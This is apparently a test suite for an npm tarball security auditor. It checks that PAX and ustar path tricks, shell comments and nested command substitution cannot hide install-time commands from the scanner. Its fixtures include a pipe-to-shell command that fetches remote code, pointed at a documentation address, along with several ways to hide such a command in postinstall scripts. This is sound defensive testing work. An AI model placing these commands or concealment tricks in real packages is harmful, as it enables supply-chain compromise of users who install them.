import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core final round: PAX path plus ustar prefix, comments and command substitution
// in lifecycle commands, and linear handling of repeated inline flags.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

interface Entry { name: string; data: string; type?: string; prefix?: string }
function tarBytes(entries: Entry[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data, "latin1");
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write(e.type ?? "0", 156);
    h.write("ustar\0" + "00", 257);
    if (e.prefix) h.write(e.prefix, 345, 155, "utf8");
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}
/** A PAX extended header record `<len> path=<value>\n`, where len counts its own digits. */
function paxPath(value: string): string {
  const body = ` path=${value}\n`;
  let len = body.length + 1;
  while (String(len).length + body.length !== len) len = String(len).length + body.length;
  return `${len}${body}`;
}
const pkg = (extra: object = {}) => JSON.stringify({ name: "demo", version: "1.0.0", ...extra });

describe("a PAX path combined with a ustar prefix", () => {
  test("the PAX path is used: a PAX-named duplicate root manifest is manifest-confusion", async () => {
    const tarball = tarBytes([
      { name: "package/package.json", data: pkg() },
      { name: "PaxHeader", data: paxPath("package/package.json"), type: "x" },
      { name: "ignored", prefix: "pre", data: pkg({ scripts: { postinstall: CURL_SH } }) },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(report.findings.some((f) => f.ruleId === "manifest-confusion"), "manifest-confusion expected");
    assert.equal(report.verdict, "block");
  });

  test("the PAX path names a scanned script", async () => {
    const tarball = tarBytes([
      { name: "package/package.json", data: pkg({ scripts: { postinstall: "node setup.js" } }) },
      { name: "PaxHeader", data: paxPath("package/setup.js"), type: "x" },
      { name: "ignored", prefix: "pre", data: `${CURL_SH}\n` },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(report.findings.some((f) => f.ruleId === "install-scripts" && f.severity === "critical"));
  });
});

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, cmd: string): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify({ scripts: { postinstall: cmd } })));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const crit = (files: Record<string, string>, cmd: string) =>
  runRules(inputFor(files, cmd)).filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");
const EVIL = { "package/evil": `${CURL_SH}\n` };

describe("comments and command substitution do not hide commands", () => {
  test("an apostrophe in a comment does not swallow later commands", () => {
    assert.equal(crit(EVIL, "# it's\n./evil").length, 1);
  });

  test("`$(...)` and backtick bodies inside double quotes are scanned", () => {
    assert.equal(crit(EVIL, 'echo "$(true; ./evil)"').length, 1);
    assert.equal(crit(EVIL, 'echo "`./evil`"').length, 1);
    assert.equal(crit(EVIL, 'echo "$(echo $(./evil))"').length, 1);
  });

  test("quote-aware inline code still works and a benign quoted separator stays clean", () => {
    assert.equal(crit(EVIL, "bash -c 'node evil && echo done'").length, 1);
    assert.equal(crit({ "package/README": "docs\n" }, "sh -c 'echo a && echo b'").length, 0);
  });
});

describe("repeated inline flags are linear", () => {
  const fast = (label: string, files: Record<string, string>, cmd: string) => {
    const t = performance.now();
    runRules(inputFor(files, cmd));
    const ms = performance.now() - t;
    console.log(`[timing] ${label}: ${ms.toFixed(0)} ms`);
    assert.ok(ms < 1000, `${label} took ${ms.toFixed(0)} ms`);
  };

  test("60,000 inline flags with unterminated quotes", () => {
    fast("unterminated", EVIL, "sh " + `-c "a `.repeat(60000) + "./evil");
  });

  test("20,000 inline flags with mid-word quotes", () => {
    fast("mid-word", EVIL, "sh " + `-c x"y `.repeat(20000));
  });

  test("20,000 unmatched `$(` and backticks", () => {
    fast("substitutions", EVIL, "echo " + "$(x ".repeat(20000) + "`y ".repeat(20000));
  });
});
